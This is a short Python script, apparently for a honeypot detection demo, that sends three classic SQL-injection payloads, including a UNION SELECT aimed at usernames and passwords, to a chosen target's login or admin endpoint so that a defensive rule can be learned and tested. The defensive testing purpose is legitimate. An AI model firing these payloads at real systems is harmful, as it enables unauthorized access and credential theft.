"""
http_sqli_sim.py
Sends the classic SQL-injection probe to a target's /login (or /admin)
endpoint. Run this FROM THE ATTACKER MACHINE/VM against the honeypot
first (this creates a Sentinel rule), then against the protected
service (the rule should catch it there - the centerpiece demo moment).

Usage:
    python http_sqli_sim.py <target_ip> <port> [path]

Examples:
    python http_sqli_sim.py 127.0.0.1 8080 /admin       # honeypot decoy
    python http_sqli_sim.py 127.0.0.1 8000 /login       # protected service
"""

import sys
import urllib.parse
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
PATH = sys.argv[3] if len(sys.argv) > 3 else "/admin"

PAYLOADS = [
    "' OR '1'='1",
    "admin'--",
    "1' UNION SELECT username, password FROM users--",
]

url = f"http://{TARGET}:{PORT}{PATH}"
print(f"[http_sqli_sim] target: {url}")

for payload in PAYLOADS:
    data = urllib.parse.urlencode({
        "username": payload,
        "password": payload,
    }).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read(120).decode("utf-8", "ignore").replace("\n", " ")
            print(f"  payload {payload!r:55} -> HTTP {resp.status}: {body[:80]}...")
    except Exception as e:
        print(f"  payload {payload!r:55} -> error: {e}")

print("\nDone. If this ran against the honeypot, a Sentinel rule should now")
print("exist citing the evidence event it was learned from. Replay against")
print("the protected service to watch the rule catch it there.")
